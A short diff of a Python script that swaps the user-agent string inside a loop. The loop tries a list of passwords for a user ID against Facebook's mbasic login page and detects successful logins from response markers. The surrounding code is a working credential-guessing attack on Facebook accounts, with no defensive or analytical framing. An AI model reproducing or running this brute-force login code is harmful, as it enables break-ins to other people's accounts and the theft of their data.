@@ -919,7 +919,7 @@ def manual():
 			pass
 		try:
 			for asu in pw.split(","):
-				ua_mb = 'Mozilla/5.0 (Linux; Android 6.0; Redmi 4X Build/MMB29M; xx-xx) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36'
+				ua_mb = 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0'
 				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': ua_mb})
 				xo = rex.content
 				if 'mbasic_logout_button' in xo or 'save-device' in xo:
